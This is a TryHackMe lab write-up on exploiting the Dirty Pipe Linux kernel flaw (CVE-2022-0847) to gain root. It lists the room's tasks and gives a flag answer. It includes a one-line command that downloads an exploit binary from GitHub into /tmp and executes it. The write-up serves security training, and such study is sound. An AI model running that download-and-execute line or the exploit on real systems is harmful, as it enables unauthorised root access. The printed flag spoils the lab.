---
title: Dirty Pipe CVE-2022-0847
author: CYB3RM3
name: CYB3RM3 | Dirty Pipe CVE-2022-0847
date: 2022-03-25 20:51:36 +0100
categories: [TryHackMe, CVE]
tags: [CVE]
---

Interactive lab for exploiting Dirty Pipe (CVE-2022-0847) in the Linux Kernel

THM Room [https://tryhackme.com/room/dirtypipe](https://tryhackme.com/room/dirtypipe)


## TASK 1 : Info - Introduction and Deploy
### Deploy the machine by clicking on the green "Deploy" button at the top of this task!
No Answer

## TASK 2 : Tutorial - Exploit Background
### Read the information in the task and understand how Dirty Pipe works.
No Answer

## TASK 3 : Practical - A Weaponised PoC
###  Follow along with the steps described in the task if you haven't already done so.

First generate the Hash and get the offset :

![Offset](/images/thm/dirtypipe/dirtypipe_1.png)
_Offset_

Then compile the exploit and launch it to get root access :

![Exploit](/images/thm/dirtypipe/dirtypipe_2.png)
_Exploit_

No Answer

### Switch user (su) into your newly created root account. What is the flag found in the /root/flag.txt file

![Flag](/images/thm/dirtypipe/dirtypipe_3.png)
_Flag_

Answer : THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}

### As mentioned previously, we have accidentally overwritten other user accounts by exploiting Dirty Pipe in this manner. This could cause issues for the server; thus, as professionals, we must clean up after our exploits. Using your root shell, restore the original /etc/passwd file from your backup.

![/etc/passwd](/images/thm/dirtypipe/dirtypipe_3.png)
_/etc/passwd_

No Answer 

## TASK 4 : Practical - Bonus TASK A Second Exploit


### Exploit the target using bl4sty's exploit for Dirty Pipe

Following the steps :

![Exploit](/images/thm/dirtypipe/dirtypipe_3.png)
_Exploit_

No Answer.

### Make sure to clean up after yourself! Remove the SUID binary created by the script (/tmp/sh).

```console
rm /tmp/sh
```
{: .nolineno }

### [Optional] Find another exploit for this vulnerability online. Review the code to ensure that it does what it claims to do, then upload it to the target and attempt to exploit the vulnerability a third way.

Using Carlos Sevieira exploit <https://github.com/carlosevieira/Dirty-Pipe> :

```console
{curl,-s,-k,https://raw.githubusercontent.com/carlosevieira/Dirty-Pipe/main/exploit-static,-o,/tmp/exploit-dirty-pipe};{chmod,+x,/tmp/exploit-dirty-pipe};/tmp/exploit-dirty-pipe
```
{: .nolineno }

No Answer.

## TASK 5 : Info - Conclusion 


### I understand the Dirty Pipe vulnerability!

No Answer.